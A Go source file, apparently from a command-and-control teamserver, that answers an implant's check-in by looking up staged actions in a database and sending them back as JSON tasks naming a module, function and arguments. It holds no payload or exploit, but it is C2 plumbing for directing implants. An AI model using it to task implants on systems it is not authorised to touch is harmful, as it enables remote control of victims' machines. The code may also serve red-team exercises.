package comms

import (
	"encoding/json"
	"fmt"
	"time"

	"github.com/ProjectHivemind/Teamserver/teamserver/pkg/crud"
	"github.com/ProjectHivemind/Teamserver/teamserver/pkg/model"
)

// ActionRequestHandler checks to see if there are any actions queued for the
// given implant.
func ActionRequestHandler(packet Packet) ([]Packet, error) {
	var allPackets []Packet

	// Check if implant has a uuid
	if packet.Implant.UUID == "" {
		return nil, fmt.Errorf("not registered")
	}

	var d crud.DatabaseModel
	d.Open()
	defer d.Close()

	_, err := d.UpdateCallBackTime(packet.Implant.UUID, time.Now().Format(crud.TimeStamp))
	if err != nil {
		return nil, fmt.Errorf("not registered")
	}

	stagedActions, err := d.GetStagedActionByImplant(packet.Implant.UUID)
	if err != nil {
		return nil, err
	}

	if len(stagedActions) == 0 {
		packet := Packet{
			Fingerprint: "fingerprint",
			Implant:     packet.Implant,
			PacketType:  NoActionEnum,
			NumLeft:     0,
			Data:        "",
		}

		allPackets = append(allPackets, packet)
		return allPackets, nil
	}

	// packetCtr := len(stagedActions)
	for i := 0; i < len(stagedActions); i++ {
		// if packetCtr == 0 {
		// 	break
		// }

		action, err := generateAction(stagedActions[i])
		if err != nil {
			// packetCtr--
			continue
		}

		bytes, _ := json.Marshal(action)

		actionPacket := Packet{
			Fingerprint: "fingerprint",
			Implant:     packet.Implant,
			PacketType:  ActionEnum,
			NumLeft:     0,
			Data:        string(bytes),
		}

		// packetCtr--
		allPackets = append(allPackets, actionPacket)

		// MOVE STAGED TO EXECUTED HERE
		d.DeleteStagedAction(stagedActions[i].Id)
		executed := model.ExecutedActions{
			Id:             stagedActions[i].Id,
			UUIDofAction:   stagedActions[i].UUIDofAction,
			TimeRan:        "",
			Successful:     false,
			ActionResponse: "",
		}
		d.InsertExecutedAction(executed)
	}

	return allPackets, nil
}

// generateAction given a staged action, it will return a sendable action Packet
func generateAction(stagedAction model.StagedActions) (Action, error) {
	var action Action
	args := make(map[string]string, 0)

	var d crud.DatabaseModel
	d.Open()
	defer d.Close()

	// Get the StoredAction from the database
	storedAction, err := d.GetStoredActionById(stagedAction.UUIDofAction)
	if err != nil {
		return action, err
	}

	// Get the Module that is being called
	module, err := d.GetModuleByName(storedAction.ModuleFunc)
	if err != nil {
		return action, fmt.Errorf("unknown module")
	}

	// Gets the ModuleFunc values needed
	var argStr []string
	for i := 0; i < len(module.ModuleFuncIds); i++ {
		moduleFunc, err := d.GetModuleFuncById(module.ModuleFuncIds[i])
		if err != nil {
			return action, fmt.Errorf("unknown modulefunc")
		}

		if moduleFunc.ModuleFuncName == storedAction.ModuleFunc {
			argStr = moduleFunc.ParameterNames
			break
		}
	}

	// Puts them in a map and Marshals it to json
	for i := 0; i < len(argStr); i++ {
		args[argStr[i]] = storedAction.Arguments[i]
	}
	bytes, _ := json.Marshal(args)

	action = Action{
		ActionID:   stagedAction.Id,
		Module:     storedAction.ModuleToRun,
		ModuleFunc: storedAction.ModuleFunc,
		Arguments:  string(bytes),
	}

	return action, nil
}
